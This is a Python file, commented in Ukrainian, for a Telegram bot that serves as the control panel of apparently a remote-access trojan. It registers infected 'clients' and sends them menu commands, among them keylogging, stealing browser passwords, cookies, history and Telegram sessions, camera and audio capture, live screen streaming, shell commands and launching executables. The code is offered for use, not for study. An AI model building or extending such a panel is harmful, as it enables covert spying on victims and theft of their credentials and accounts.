# bot.py

# bot_server.py

import os
from dotenv import load_dotenv
import logging

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Updater, CommandHandler, CallbackQueryHandler,
    MessageHandler, Filters, CallbackContext
)

# ================== Налаштування ==================
BOT_TOKEN = "tut bot token"

# Шаблон меню функцій
FUNCTION_MENU = [
    ["sysinfo",      "Системна інфо"],
    ["ls",           "Файловий менеджер"],
    ["ps",           "Список процесів"],
    ["kill",         "Завершити процес"],
    ["shell",        "Shell-команди"],
    ["screenshot",   "Скріншот"],
    ["keylog",       "Кейлогер"],
    ["audio",        "Аудіо"],
    ["photo",        "Фото з камери"],
    ["livescreen",   "Live-стрім екрану"],
    ["clip",         "Буфер обміну"],
    ["update",       "Авто-оновлення"],
    ["wifi",         "Wi-Fi сканер"],
    ["run",          "Запуск .exe"],
    ["lock",         "Блок/розбл. екран"],
    ["shutdown",     "Вимкнути ПК"],
    ["reboot",       "Перезавантажити"],
    ["pw",           "Паролі браузера"],
    ["cookies",      "Куки браузера"],
    ["history",      "Історія браузера"],
    ["tgsession",    "Telegram session"],
    ["getlink",      "Генер. лінк"],
]

# Клієнти: client_id → chat_id
clients = {}
current_client = None

# ================== Обробка реєстрації ==================
def handle_register(update: Update, ctx: CallbackContext):
    text = update.message.text.strip()
    if text.startswith("/register"):
        # Повідомлення від клієнта: "/register CLIENT_ID"
        parts = text.split(" ", 1)
        if len(parts) == 2:
            client_id = parts[1]
            clients[client_id] = update.effective_chat.id
            update.message.reply_text(f"✅ Зареєстровано клієнта `{client_id}`", parse_mode="Markdown")

# ================== Команда /clients ==================
def cmd_clients(update: Update, ctx: CallbackContext):
    if not clients:
        update.message.reply_text("⚠️ Жодного клієнта не зареєстровано.")
        return
    keyboard = [
        [InlineKeyboardButton(cid, callback_data=f"select:{cid}")]
        for cid in clients
    ]
    update.message.reply_text("🔍 Обріть клієнта:", reply_markup=InlineKeyboardMarkup(keyboard))

# ================== Вибір клієнта ==================
def select_client(cb: Update, ctx: CallbackContext):
    global current_client
    data = cb.callback_query.data  # "select:CLIENT_ID"
    client_id = data.split(":",1)[1]
    current_client = client_id
    # Створюємо меню функцій
    kb = []
    row = []
    for cmd, label in FUNCTION_MENU:
        row.append(InlineKeyboardButton(label, callback_data=f"cmd:{cmd}"))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    # Додаємо кнопку Назад
    kb.append([InlineKeyboardButton("🔙 Назад", callback_data="back")])
    cb.callback_query.edit_message_text(
        f"👤 Ціль: `{client_id}`\nОбріть дію:", parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb)
    )

# ================== Обробка обраної функції ==================
def handle_command(cb: Update, ctx: CallbackContext):
    global current_client
    data = cb.callback_query.data  # "cmd:sysinfo" або "back"
    if data == "back":
        # Повернення до списку клієнтів
        cb.callback_query.edit_message_text("🔍 Обріть клієнта:")
        return cmd_clients(cb.callback_query, ctx)
    _, cmd = data.split(":",1)
    chat_id = clients.get(current_client)
    if not chat_id:
        cb.callback_query.answer("❌ Клієнт офлайн", show_alert=True)
    else:
        # Відправляємо текстову команду клієнту
        ctx.bot.send_message(chat_id, f"/{cmd}")
        cb.callback_query.answer(f"▶️ Відправлено /{cmd} клієнту")

# ================== Основна функція ==================
def main():
    logging.basicConfig(level=logging.INFO)
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Обробники
    dp.add_handler(MessageHandler(Filters.text & Filters.private, handle_register))
    dp.add_handler(CommandHandler("clients", cmd_clients))
    dp.add_handler(CallbackQueryHandler(select_client, pattern="^select:"))
    dp.add_handler(CallbackQueryHandler(handle_command, pattern="^cmd:"))
    dp.add_handler(CallbackQueryHandler(handle_command, pattern="^back$"))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
